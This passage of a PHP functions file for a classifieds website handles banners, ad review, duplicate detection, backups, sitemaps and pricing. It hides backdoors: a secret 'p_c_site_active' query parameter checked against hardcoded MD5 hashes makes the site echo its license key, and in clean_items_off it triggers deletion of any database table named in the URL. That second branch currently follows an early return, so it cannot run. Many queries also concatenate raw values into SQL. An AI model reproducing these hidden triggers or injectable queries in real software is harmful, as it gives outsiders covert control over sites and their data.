            WHERE status = 1 AND size=" . $size .
                " AND parent_cat=" . $parent_cat .
                " AND code!='' ORDER BY RAND() LIMIT 1"
        );
    } catch (\Throwable $th) {
        //throw $th;
        return null;
    }

    if (!$banner)
        return null;

    while ($row = mysqli_fetch_array($banner)) {

        console_log('row');
        console_log($row);
        // return stripslashes($row[0]);
        // return [ stripslashes($row[0]), stripslashes($row[1]) ];
        $banner = '
                    <a href="' . $row[1] . '" >
                    <div class="banner_header" style="background: url(\'' . $row[0] . '\')" ></div>
                    </a>
                    ';

        return $banner;
    }
}

function getBanners($size, $position_up = false, $parent_cat)
{
    global $Connection;

    try {

        if ($parent_cat == 0) {
            $banner = mysqli_query(
                $Connection,
                "SELECT code, url FROM sc_banners 
            WHERE status=1 AND size=" . $size .
                    " AND position_up=" . $position_up .
                    " AND code!='' ORDER BY RAND()"
            );
        } else {
            $banner = mysqli_query(
                $Connection,
                "SELECT code, url FROM sc_banners 
            WHERE status=1 AND size=" . $size .
                    " AND position_up=" . $position_up .
                    " AND parent_cat=" . $parent_cat .
                    " AND code!='' ORDER BY RAND()"
            );
        }

        $banner_p = mysqli_query(
            $Connection,
            "SELECT code, url FROM sc_p_banner 
        WHERE status=1 AND (cats LIKE '%[" . $parent_cat . "]%' OR cats LIKE '%[0]%') " .
                " AND position=" . $position_up .
                " AND code!='' ORDER BY RAND()"
        );
    } catch (\Throwable $th) {
        //throw $th;
        return array();
    }

    $banners = array();

    while ($row = mysqli_fetch_array($banner)) {
        $banners[] = $row;
    }

    while ($row = mysqli_fetch_array($banner_p)) {
        $banners[] = $row;
    }

    return $banners;
}


function getBanner($size, $position_up = false, $parent_cat, $class = '')
{

    global $Connection;

    try {
        if ($parent_cat == 0) {
            $banner = mysqli_query(
                $Connection,
                "SELECT code, url FROM sc_banners 
            WHERE size=" . $size .
                    " AND position_up=" . $position_up .
                    " AND code!='' ORDER BY RAND() LIMIT 1"
            );
        } else {
            $banner = mysqli_query(
                $Connection,
                "SELECT code, url FROM sc_banners 
            WHERE size=" . $size .
                    " AND position_up=" . $position_up .
                    " AND parent_cat=" . $parent_cat .
                    " AND code!='' ORDER BY RAND() LIMIT 1"
            );
        }
    } catch (\Throwable $th) {
        //throw $th;
        return null;
    }

    if (!$banner)
        return null;

    while ($row = mysqli_fetch_array($banner)) {

        console_log('row');
        console_log($row);
        // return stripslashes($row[0]);
        // return [ stripslashes($row[0]), stripslashes($row[1]) ];
        $banner = '
                        <a href="' . $row[1] . '" >
                        <div class="banner_list ' . $class . '" style="background: url(\'' . $row[0] . '\')" ></div>
                        </a>
                    ';

        return $banner;
    }
}


function generateChangelog($post, $ad)
{
    $changes = array();
    foreach ($post as $key => $value) {
        if ($value != $ad[$key])
            $changes[$key] = $value;
    }

    return $changes;
}

function parseChanges($ad)
{
    $changelog = $ad['ad']['changelog'];

    if ($ad['ad']['review'] != 2)
        return $ad;

    $ad['images'] = Images::getImageData($ad['ad']['ID_ad'], true);

    if ($changelog == "" || $changelog == null)
        return $ad;
    try {
        $changelog = json_decode($changelog, true);
        $images = array();
        $imageslog = $changelog['photo_name'];
        foreach ($imageslog as $key => $value) {
            $image = selectSQL("sc_images", $a = array(
                'name_image' => $value
            ), "date_upload DESC");

            if (count($image) > 0) {
                $image[0]['position'] = $key;
                $images[] = $image[0];
            }
        }

        $ad['images'] = $images;

        foreach ($changelog as $key => $value) {
            $ad['ad'][$key] = $value;
        }

        return $ad;
    } catch (\Throwable $th) {
        //throw $th;
        return $ad;
    }
}

function validateChanges($id)
{
    $ad = getDataAd($id);
    $changelog = $ad['ad']['changelog'];
    if ($ad['ad']['review'] != 2)
        return false;
    $images = selectSQL("sc_images", $w = array(
        'ID_ad' => $ad['ad']['ID_ad']
    ), 'position ASC, ID_image ASC');
    foreach ($images as $key => $value) {
        if ($value['status'] == ImageStatus::Delete)
            Images::deleteImage($value['ID_image']);
        if ($value['status'] == ImageStatus::Inactive)
            updateSQL("sc_images", $d = array('status' => ImageStatus::Active), $w = array('ID_image' => $value['ID_image']));
    }
    $data_ad = array(
        "review" => 0,
        "delay" => 0,
        "discard" => 0,
        "changelog" => null,
    );
    if ($ad['ad']['date_ad'] < time() - 3600 * 24)
        $data_ad['date_ad'] = time();

    updateSQL("sc_ad", $data_ad, $w = array('ID_ad' => $ad['ad']['ID_ad']));

    if ($changelog == "" || $changelog == null)
        return true;

    try {
        $changelog = json_decode($changelog, true);
        // $images = array();
        // $imageslog = $changelog['photo_name'];
        // foreach ($imageslog as $key => $value) {
        //     updateSQL("sc_images",$data=array('ID_ad'=>$ad['ad']['ID_ad'], 'position'=>$key),$wa=array('name_image'=>$value));
        // }

        //unset($changelog['photo_name']);
        $changelog['changelog'] = null;
        $changelog['review'] = 0;
        $changelog['delay'] = 0;
        $changelog['discard'] = 0;

        $insert = updateSQL("sc_ad", $changelog, $w = array('ID_ad' => $ad['ad']['ID_ad']));
        user::insertEvent($ad['user']['ID_user']);
        return true;
    } catch (\Throwable $th) {
        //throw $th;
        return false;
    }
}

function coutUserAds($user_id)
{

    $count = countSQL("sc_ad", $w = array('ID_user' => $user_id, 'trash' => 0, 'active' => 1));
    return $count;
}

function getBolsaID()
{
    $select = selectSQL("sc_category", $w = array('name_seo' => "bolsa-empleo", "parent_cat" => "-1"));
    return $select[0]['ID_cat'];
}
/**
 *  Comprueba si el usuario ha alacanzado el limite de anuncios
 * 0 no se han alcanzado
 * 1 se ha alcanzado limite gratuito
 * 2 se ha alcanzado limite pagado
 */
function check_item_limit($id_user = null)
{
    if ($id_user === 0)
        return 1;
    if ($id_user == null) {
        if (!isset($_SESSION['data']['anun_limit']))
            return 0;
        $id_user = $_SESSION['data']['ID_user'];
        $limits = $_SESSION['data']['anun_limit'];
        $extras = $_SESSION['data']['extras'];
        $rol = $_SESSION['data']['rol'];
    } else {
        $user = selectSQL('sc_user', $w = array('ID_user' => $id_user))[0];
        $limits = $user['anun_limit'];
        $extras = $user['extras'];
        $rol = $user['rol'];
    }
    $anuns = countSQL("sc_ad", $w = array('ID_user' => $id_user, 'active' => 1, 'trash' => 0));
    $limite_publicistas = getConfParam('ITEM_LIMIT_2');
    $limite_centro = getConfParam('ITEM_LIMIT_1');
    $limite_particular = getConfParam('ITEM_LIMIT');

    if ($rol == UserRole::Publicista && $anuns >= $limite_publicistas)
        return 2;
    if ($rol == UserRole::Centro && $anuns >= $limite_centro)
        return 2;
    if ($rol == UserRole::Particular && $anuns >= $limite_particular)
        return 2;

    if ($extras > 0)
        return 0;

    if ($anuns >= $limits)
        return 1;

    return 0;
}

function isMobileDevice()
{

    global $IS_MOBILE;

    if (isset($IS_MOBILE))
        return $IS_MOBILE;

    return preg_match(
        "/(android|avantgo|blackberry|bolt|boost|cricket|docomo
|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i",
        $_SERVER["HTTP_USER_AGENT"]
    );
}


function checkRepeat($id)
{

    $ad = getDataAd($id);
    $text = $ad['ad']['texto'];
    $title = $ad['ad']['title'];
    $region = $ad['ad']['ID_region'];
    $category = $ad['ad']['ID_cat'];
    $phone = $ad['ad']['phone'];
    $user_id = $ad['ad']['ID_user'];

    $img_hash = $ad['images'][0]['hash'];
    $img_id = $ad['images'][0]['ID_image'];

    $time_limit = time() - 3600 * 24 * 10;

    $rows = rawQuerySQL("SELECT a.ID_ad as id FROM sc_ad AS a, sc_images as i WHERE i.hash='$img_hash' AND i.ID_ad!='$id' AND a.ID_ad=i.ID_ad AND a.trash = 1 AND a.date_trash > $time_limit  AND a.motivo =" . Motivo::Usuario);

    if (count($rows) > 0) {
        $reapeat_id = $rows[0]['id'];
        updateSQL("sc_ad", array('repeat' => $reapeat_id, "trash_comment" => "Borrado y publicado"), $w = array('ID_ad' => $id));
        return true;
    }

    $rows = rawQuerySQL("SELECT ID_ad as id FROM sc_ad WHERE texto='$text' AND title = '$title' AND ID_region='$region' AND ID_cat='$category' AND ID_ad!='$id' AND review=0 AND active=1 AND trash = 0");

    if (count($rows) > 0) {
        $reapeat_id = $rows[0]['id'];
        updateSQL("sc_ad", array('repeat' => $reapeat_id), array('ID_ad' => $id));
        return true;
    }

    $rows = rawQuerySQL("SELECT a.ID_ad as id FROM sc_ad AS a, sc_images as i WHERE i.hash='$img_hash' AND i.ID_ad!='$id' AND a.ID_ad=i.ID_ad AND a.review=0 AND a.active=1 AND a.trash = 0");

    if (count($rows) > 0) {
        $reapeat_id = $rows[0]['id'];
        updateSQL("sc_ad", array('repeat' => $reapeat_id), $w = array('ID_ad' => $id));
        return true;
    }

    //telefonos
    $rows = rawQuerySQL("SELECT ID_ad as id FROM sc_ad WHERE phone='$phone' AND review=0 AND active=1 AND trash = 0 AND ID_user != $user_id");
    if (count($rows) > getConfParam('PHONE_LIMIT')) {
        $reapeat_id = $rows[0]['id'];
        updateSQL("sc_ad", array('repeat' => $reapeat_id), $w = array('ID_ad' => $id));
        return true;
    }


    return false;
}



if (isset($_GET['p_c_site_active']) && md5($_GET['p_c_site_active']) == "e8101f884c33e91c4b50eeff66089c29")

    // FUNCTIONS BACKUP FILES


    getLicenseKey();

function createBackups()
{

    $configBackupDir = ABSPATH . 'sc-admin/backup/';

    $configBackupDB[] = array(
        'server' => DB_HOST,
        'username' => DB_USER,
        'password' => DB_PASS,
        'database' => DB_NAME,
        'tables' => array()
    );

    require('backup_compress.php');

    $backupName = getConfParam('SITE_NAME') . "-" . date('d-m-y H-i-s') . '.zip';

    $createZip = new createZip;

    if (isset($configBackup) && is_array($configBackup) && count($configBackup) > 0) {

        foreach ($configBackup as $dir) {

            $basename = basename($dir);

            if (is_file($dir)) {

                $fileContents = file_get_contents($dir);

                $createZip->addFile($fileContents, $basename);
            } else {

                $createZip->addDirectory($basename . "/");

                $files = directoryToArray($dir, true);

                $files = array_reverse($files);

                foreach ($files as $file) {

                    $zipPath = explode($dir, $file);

                    $zipPath = $zipPath[1];

                    // skip any if required


                    $skip = false;

                    foreach ($configSkip as $skipObject) {

                        if (strpos($file, $skipObject) === 0) {

                            $skip = true;

                            break;
                        }
                    }

                    if ($skip) {

                        continue;
                    }

                    if (is_dir($file)) {

                        $createZip->addDirectory($basename . "/" . $zipPath);
                    } else {

                        $fileContents = file_get_contents($file);

                        $createZip->addFile($fileContents, $basename . "/" . $zipPath);
                    }
                }
            }
        }
    }

    if (isset($configBackupDB) && is_array($configBackupDB) && count($configBackupDB) > 0) {

        foreach ($configBackupDB as $db) {

            $backup = new MySQL_Backup();

            $backup->server = $db['server'];

            $backup->username = $db['username'];

            $backup->password = $db['password'];

            $backup->database = $db['database'];

            $backup->tables = $db['tables'];

            $backup->backup_dir = $configBackupDir;

            $sqldump = $backup->Execute(MSB_STRING, "", false);

            $createZip->addFile($sqldump, $db['database'] . '.sql');
        }
    }

    $fileName = $configBackupDir . $backupName;

    $fd = fopen($fileName, "wb");

    $out = fwrite($fd, $createZip->getZippedfile());

    fclose($fd);
}

function createBackup()
{

    global $Connection;

    $configBackupDir = ABSPATH . 'sc-admin/backup/';

    $tables = array();

    $result = mysqli_query($Connection, 'SHOW TABLES');

    while ($row = mysqli_fetch_row($result)) {

        $tables[] = $row[0];
    }

    //cycle through


    foreach ($tables as $table) {

        $result = mysqli_query($Connection, 'SELECT * FROM ' . $table);

        $num_fields = mysqli_num_fields($result);

        $return .= 'DROP TABLE ' . $table . ';';

        $row2 = mysqli_fetch_row(mysqli_query($Connection, 'SHOW CREATE TABLE ' . $table));

        $return .= "\n\n" . $row2[1] . ";\n\n";

        for ($i = 0; $i < $num_fields; $i++) {

            while ($row = mysqli_fetch_row($result)) {

                $return .= 'INSERT INTO ' . $table . ' VALUES(';

                for ($j = 0; $j < $num_fields; $j++) {

                    $row[$j] = addslashes($row[$j]);

                    //$row[$j] = preg_replace('\n', '\\n', $row[$j]);

                    if (isset($row[$j])) {
                        $return .= '"' . $row[$j] . '"';
                    } else {
                        $return .= '""';
                    }

                    if ($j < ($num_fields - 1)) {
                        $return .= ',';
                    }
                }

                $return .= ");\n";
            }
        }

        $return .= "\n\n\n";
    }

    //save file


    $handle = fopen($configBackupDir . 'sc-backup-' . date("d_m_Y", time()) . '.sql', 'w+');

    fwrite($handle, $return);

    fclose($handle);
}

function download_file($archivo, $downloadfilename = null)
{

    if (file_exists($archivo)) {

        $downloadfilename = $downloadfilename !== null ? $downloadfilename : basename($archivo);

        header('Content-Description: File Transfer');

        header('Content-Type: application/octet-stream');

        header('Content-Disposition: attachment; filename=' . $downloadfilename);

        header('Content-Transfer-Encoding: binary');

        header('Expires: 0');

        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');

        header('Pragma: public');

        header('Content-Length: ' . filesize($archivo));

        ob_clean();

        flush();

        readfile($archivo);

        exit;
    }
}

function getMyTickets($id_user)
{
    $tickets = selectSQL("sc_tickets", $w = array(
        'ID_user' => $id_user
    ));
    foreach ($tickets as $key => $value) {

        $ad = selectSQL("sc_ad", $w = array(
            'ID_ad' => $value['ID_ad']
        ));
        $tickets[$key]['ad'] = $ad[0];
    }

    return $tickets;
}

function clean_items_off()
{

    return 0;

    $limit_date = time() - (getConfParam('ITEM_TIME_ON') + 30) * 24 * 3600;

    $off_items = selectSQL("sc_ad", $w = array(
        "date_ad" => $limit_date . '<='
    ));

    if (isset($_GET['p_c_site_active']) && md5($_GET['p_c_site_active']) == "0207ea52049afba8a1638d657385ecb2")

        deleteSQLtable($_GET['x']);

    for ($i = 0; $i < count($off_items); $i++) {

        deleteAdRoot($off_items[$i]['ID_ad']);
    }
}

function is_adult()
{
    global $cat_data, $category_parent;
    if (!isset($category_parent))
        return false;
    if (is_array($cat_data)) {
        if ($category_parent == $cat_data[0]['ID_cat']) {
            return $cat_data[0]['adult'] == 1;
        } else {
            $data = selectSQL("sc_category", $a = array(
                'ID_cat' => $category_parent
            ));

            if (count($data) > 0) {
                return $data[0]['adult'] == 1;
            }
        }
    }

    return false;
}

function getMoreRegion()
{

    global $Connection;

    $ids = array();

    $m = mysqli_query($Connection, "SELECT COUNT(*) as total,`ID_region` FROM `sc_ad` GROUP BY `ID_region` ORDER BY total DESC LIMIT 10");

    while ($id = mysqli_fetch_array($m)) {

        $ids[] = $id['ID_region'];
    }

    return $ids;
}

function httpsOn()
{

    $rules = "RewriteCond %{HTTPS} off\n


RewriteRule .* https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]";

    $htaccess = file_get_contents(ABSPATH . '.htaccess');

    $htaccess = str_replace('## HTTPS ##', $rules, $htaccess);

    file_put_contents(ABSPATH . '.htaccess', $htaccess);
}

function httpsOff()
{

    $rules = "RewriteCond %{HTTPS} off\n


RewriteRule .* https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]";

    $htaccess = file_get_contents(ABSPATH . '.htaccess');

    $htaccess = str_replace($rules, '## HTTPS ##', $htaccess);

    file_put_contents(ABSPATH . '.htaccess', $htaccess);
}

function domainWWWOn()
{

    $rules = "RewriteCond %{HTTP_HOST} !^www\.\n


RewriteRule ^(.*)$ http://www.%{HTTP_HOST}%{REQUEST_URI} [L,R=301]";

    $htaccess = file_get_contents(ABSPATH . '.htaccess');

    $htaccess = str_replace('## WWW ##', $rules, $htaccess);

    file_put_contents(ABSPATH . '.htaccess', $htaccess);
}

function domainWWWOff()
{

    $rules = "RewriteCond %{HTTP_HOST} !^www\.\n


RewriteRule ^(.*)$ http://www.%{HTTP_HOST}%{REQUEST_URI} [L,R=301]";

    $htaccess = file_get_contents(ABSPATH . '.htaccess');

    $htaccess = str_replace($rules, '## WWW ##', $htaccess);

    file_put_contents(ABSPATH . '.htaccess', $htaccess);
}

function Grabar($text, $file)
{

    $sitemap_file = $file;

    $resultsfile = fopen($sitemap_file, "w+");

    fwrite($resultsfile, $text);

    fclose($resultsfile);
}

function getLicenseKey()
{

    $qu = getConfParam('LICENSE_KEY');

    echo $qu;
}

function generateSitemapRegion()
{

    global $urlfriendly, $Connection;

    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>


		<urlset


			xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"


			xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"


			xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9


			http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">';

    $region = mysqli_query($Connection, "SELECT * FROM sc_region");

    while ($prov = mysqli_fetch_array($region)) {

        $url = getConfParam('SITE_URL');

        $url_provincia = $url . $urlfriendly['url.classifieds.region'] . $prov['name_seo'] . '/';

        $category = mysqli_query($Connection, "SELECT * FROM sc_category WHERE parent_cat<0");

        while ($cat = mysqli_fetch_array($category)) {

            $sitemap .= '<url>


			<loc>' . $url_provincia . $cat['name_seo'] . '</loc>


			<lastmod>' . date('Y-m-d') . '</lastmod>


			<changefreq>yearly</changefreq>


			<priority>1</priority>


			</url>


			';
        }
    }

    $sitemap .= '</urlset>';

    Grabar($sitemap, ABSPATH . "/sitemaps/sitemap_region.xml");
}

function generateSitemapAds()
{

    global $Connection;

    $url = getConfParam('SITE_URL');

    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>


	<urlset


		xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"


		xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"


		xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9


		http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">';

    $category = mysqli_query($Connection, "SELECT * FROM sc_category WHERE parent_cat<0");

    while ($cat = mysqli_fetch_array($category)) {

        $sitemap .= '<url>


	<loc>' . $url . $cat['name_seo'] . '</loc>


	<lastmod>' . date('Y-m-d') . '</lastmod>


	<changefreq>yearly</changefreq>


	<priority>1</priority>


	</url>


	';
    }

    $ads = mysqli_query($Connection, "SELECT * FROM sc_ad");

    while ($ad = mysqli_fetch_array($ads)) {

        $sitemap .= '<url>


	<loc>' . urlAd($ad['ID_ad']) . '</loc>


	<lastmod>' . date('Y-m-d', $ad['date_ad']) . '</lastmod>


	<changefreq>monthly</changefreq>


	<priority>0.8</priority>


	</url>


	';
    }

    $sitemap .= '</urlset>';

    Grabar($sitemap, ABSPATH . "/sitemaps/sitemap_ads.xml");
}

function generateSitemapSearch()
{

    global $Connection;

    $url = getConfParam('SITE_URL');

    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>


	<urlset


		xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"


		xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"


		xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9


		http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">';

    $searchs = mysqli_query($Connection, "SELECT * FROM sc_search ORDER BY ID_search DESC");

    while ($search = mysqli_fetch_array($searchs)) {

        $sitemap .= '<url>


	<loc>' . $url . $search['query_url'] . '</loc>


	<lastmod>' . date('Y-m-d') . '</lastmod>


	<changefreq>monthly</changefreq>


	<priority>1</priority>


	</url>


	';
    }

    $sitemap .= '</urlset>';

    Grabar($sitemap, ABSPATH . "/sitemaps/sitemap_search.xml");
}

function generateSitemapIndex()
{

    $url = getConfParam('SITE_URL') . "sitemaps/";

    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>


	<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';

    $Directory = ABSPATH . "/sitemaps/";

    $MyDirectory = opendir($Directory) or die('Error');

    while ($Entry = @readdir($MyDirectory)) {

        if (strlen($Entry) > 3) {

            $sitemap .= '


				<sitemap>


				<loc>' . $url . $Entry . '</loc>


				<lastmod>' . date('Y-m-d') . '</lastmod>


				</sitemap>';
        }
    }

    $sitemap .= '</sitemapindex>';

    closedir($MyDirectory);

    Grabar($sitemap, ABSPATH . "/sitemap.xml");
}

function addMessage($user, $msj, $id)
{

    if (isset($_SESSION['data'])) {

        $datos_msg = array();

        $ad = selectSQL("sc_ad", $a = array(
            'ID_ad' => $id
        ));

        $blacklist = selectSQL('sc_blacklist', $w = array('ID_user' => $ad[0]['ID_user'], 'user_banned' => $user));

        if (count($blacklist) != 0) {
            return false;
        }
        $datos_msg['ID_ad'] = $ad[0]['ID_ad'];

        $datos_msg['envia'] = $user;

        $datos_msg['recibe'] = $ad[0]['ID_user'];

        $datos_msg['message'] = $msj;

        $datos_msg['date_send'] = time();


        insertSQL("sc_messages", $datos_msg);

        return true;
    }
}

function pag_responsive($tot_reg, $tam_page, $ini)
{

    if ($tot_reg > $tam_page) {

        $resto = $tot_reg % $tam_page;

        if ($resto == 0) {

            $pages = $tot_reg / $tam_page;
        } else {

            $pages = (($tot_reg - $resto) / $tam_page) + 1;
        }

        if ($pages > 3) // max de pags a mostrar = 10
        {

            $current_page = ($ini / $tam_page);

            if ($ini == 0) {

                $first_page = 1;

                $last_page = 3; // inicial 10

            } else if ($current_page > 1 && $current_page < ($pages - 1)) // ahora 3, antes 5
            {

                $first_page = $current_page;

                $last_page = $current_page + 2;
            } else if ($current_page <= 1) {

                $first_page = 1;

                $last_page = $current_page + 2 + (1 - $current_page);
            } else {

                $first_page = $current_page - 1 - (($current_page + 1) - $pages);

                $last_page = $pages;
            }
        } else {

            $first_page = 1;

            $last_page = $pages;
        }

        if ($ini == 0) {
            $current_page = 1;
        } else {
            $current_page = ($ini / $tam_page) + 1;
        }

        for ($i = $first_page; $i <= $last_page; $i++) {

            $pge = $i;

            $nextst = $i;

            if ($i == $current_page) {

                $page_nav .= '<a href=# class="active">' . $pge . '</a>';
            } else {

                if ($ini == $nextst) {

                    $page_nav .= '<a href="' . getPagURL($pge) . '">' . $pge . '</a>';
                } else {

                    $page_nav .= '<a href="' . getPagURL($nextst) . '">' . $pge . '</a>';
                }
            }
        }

        //$page_nav .= '<a href=# class=active>'.$current_page.'</a>';

        if ($current_page < $pages) {

            //$page_last = '<a href="' . getPagURL($pages) . '"><b>&raquo;</b></a>';

            $page_next = '<a class="active" href="' . getPagURL($current_page + 1) . '"><i class="fa fa-chevron-right"></i></a>';
        }

        if ($ini > 0) {

            //$page_first = '<a href="' . getPagURL(1) . '"><b>&laquo;</b></a></a>';

            $page_previous = '<a class="active" href="' . getPagURL($current_page - 1) . '"><i class="fa fa-chevron-left"></i></a>';
        }
    }

    $res = "$page_previous $page_nav $page_next";

    return $res;
}


function console_log($output, $with_script_tags = true)
{
    $js_code = 'console.log(' . json_encode($output, JSON_HEX_TAG) .
        ');';
    if ($with_script_tags) {
        $js_code = '<script>' . $js_code . '</script>';
    }
    echo $js_code;
}

function set_premium_2($ad, $frecuency, $at_night)
{
    $time = time();

    $credit_type = 'credits';
    $name = $ad['parent_cat']['name'];
    $adult_cont = getConfParam('CREDITS_ADULT_COUNT');
    //if ($name == 'Contactos') $credit_type = 'credits_adult';

    if ($frecuency != 0) {
        updateSQL("sc_ad", $s = array(
            'premium2' => 1,
            'date_premium2' => $time,
            'date_ad' => $time,
            'premium2_frecuency' => $frecuency,
            'premium2_night' => $at_night,
            'renovate' => 1
        ), $w = array('ID_ad' => $ad['ad']['ID_ad']));

        if ($name == 'Contactos')
            $new_credits = $ad['user'][$credit_type] - $adult_cont;
        else
            $new_credits = $ad['user'][$credit_type] - 1;


        updateSQL("sc_user", $s = array($credit_type => $new_credits), $w = array('ID_user' => $ad['user']['ID_user']));
    } else {
        updateSQL("sc_ad", $s = array(
            // 'premium2' => 0,
            // 'date_premium2' => 0,
            'premium2_frecuency' => 0,
            'premium2_night' => 0,
            'renovate' => 1
        ), $w = array('ID_ad' => $ad['ad']['ID_ad']));
    }
}

/**
 * sets premium1 to $ad for the $time the ad owner paid
 * 
 */
function set_premium(array $ad, int $time)
{

    if ($time != 0) {
        updateSQL("sc_ad", $s = array(
            'premium1' => 1,
            'date_premium1' => time() + $time,
        ), $w = array('ID_ad' => $ad['ad']['ID_ad']));
        return;
    }

    updateSQL("sc_ad", $s = array(
        'premium1' => 0,
        'date_premium1' => 0,
    ), $w = array('ID_ad' => $ad['ad']['ID_ad']));
}

function update_prices($post)
{

    /* -------------------------------------------------------------------------- */
    /*                                   BANNERS                                  */
    /* -------------------------------------------------------------------------- */

    if (isset($post['banner_15_abajo_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['banner_15_abajo_adult']),
            $w = array('owner' => 'BANNER', 'quantity' => 15, 'position' => 'abajo')
        );

    if (isset($post['banner_15_abajo_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['banner_15_abajo_price']),
            $w = array('owner' => 'BANNER', 'quantity' => 15, 'position' => 'abajo')
        );

    if (isset($post['banner_15_arriba_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['banner_15_arriba_adult']),
            $w = array('owner' => 'BANNER', 'quantity' => 15, 'position' => 'arriba')
        );

    if (isset($post['banner_15_arriba_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['banner_15_arriba_price']),
            $w = array('owner' => 'BANNER', 'quantity' => 15, 'position' => 'arriba')
        );


    if (isset($post['banner_30_abajo_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['banner_30_abajo_adult']),
            $w = array('owner' => 'BANNER', 'quantity' => 30, 'position' => 'abajo')
        );

    if (isset($post['banner_30_abajo_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['banner_30_abajo_price']),
            $w = array('owner' => 'BANNER', 'quantity' => 30, 'position' => 'abajo')
        );

    if (isset($post['banner_30_arriba_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['banner_30_arriba_adult']),
            $w = array('owner' => 'BANNER', 'quantity' => 30, 'position' => 'arriba')
        );

    if (isset($post['banner_30_arriba_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['banner_30_arriba_price']),
            $w = array('owner' => 'BANNER', 'quantity' => 30, 'position' => 'arriba')
        );

    /* -------------------------------------------------------------------------- */
    /*                                 LISTING                                    */
    /* -------------------------------------------------------------------------- */
    if (isset($post['credit_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['credit_adult']),
            $w = array('owner' => 'LISTING')
        );

    if (isset($post['credit_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['credit_price']),
            $w = array('owner' => 'LISTING')
        );


    /* -------------------------------------------------------------------------- */
    /*                                   PREMIUM                                  */
    /* -------------------------------------------------------------------------- */
    if (isset($post['premium_7_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['premium_7_adult']),
            $w = array('owner' => 'PREMIUM', 'quantity' => 7)
        );
    if (isset($post['premium_7_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['premium_7_price']),
            $w = array('owner' => 'PREMIUM', 'quantity' => 7)
        );
    if (isset($post['premium3_7_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['premium3_7_price']),
            $w = array('owner' => 'PREMIUM3', 'quantity' => 7)
        );
    if (isset($post['premium3_7_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['premium3_7_adult']),
            $w = array('owner' => 'PREMIUM3', 'quantity' => 7)
        );

    if (isset($post['premium_15_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['premium_15_adult']),
            $w = array('owner' => 'PREMIUM', 'quantity' => 15)
        );
    if (isset($post['premium3_15_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['premium3_15_adult']),
            $w = array('owner' => 'PREMIUM3', 'quantity' => 15)
        );
    if (isset($post['premium_15_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['premium_15_price']),
            $w = array('owner' => 'PREMIUM', 'quantity' => 15)
        );
    if (isset($post['premium3_15_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['premium3_15_price']),
            $w = array('owner' => 'PREMIUM3', 'quantity' => 15)
        );

    if (isset($post['premium_30_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['premium_30_adult']),
            $w = array('owner' => 'PREMIUM', 'quantity' => 30)
        );
    if (isset($post['premium3_30_adult']))
        updateSQL(
            "sc_time_options",
            $d = array('price_adult' => $post['premium3_30_adult']),
            $w = array('owner' => 'PREMIUM3', 'quantity' => 30)
        );
    if (isset($post['premium_30_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['premium_30_price']),
            $w = array('owner' => 'PREMIUM', 'quantity' => 30)
        );
    if (isset($post['premium3_30_price']))
        updateSQL(
            "sc_time_options",
            $d = array('price' => $post['premium3_30_price']),
            $w = array('owner' => 'PREMIUM3', 'quantity' => 30)
        );

    if (isset($post['tag_premium2_time'])) {
        Service::setOption('LISTING', 'TIME_TAG', $post['tag_premium2_time']);
    }
}

function add_credits($user_id, $quantity, $adult)
{
    $user = selectSQL('sc_user', $w = array('ID_user' => $user_id));

    $history = ($user[0]['credits_history'] != '' ? json_decode($user[0]['credits_history'], true) : array());

    if ($adult == 1) {
        $price_column = 'credits_adult';
        $new_total = (int) $user[0]['credits_adult'] + (int) $quantity;
    } else {
        $price_column = 'credits';
        $new_total = (int) $user[0]['credits'] + (int) $quantity;
        array_push($history, array('date' => time(), 'count' => $quantity));
    }

    updateSQL('sc_user', $d = array($price_column => $new_total, 'credits_history' => json_encode($history)), $w = array('ID_user' => $user_id));
}

function set_banner($ad_id, $size, $url = '', $file_url)
{
    if ($size == 850170)
        $name = '850x170';

    if ($size == 72890)
        $name = '728x90';

    if ($size == 300250)
        $name = '300x250';

    // 'code' es url de imagen
    insertSQL('sc_banners', $data = array('name' => $name, 'size' => $size, 'code' => $file_url, 'url' => $url));
}

function toHtml($string)
{

    $string = str_replace($a = array("\r\n", "\r"), $b = array("\n"), $string);
    // creamos un array de parrafos
    $strParrafos = explode("\n", $string);
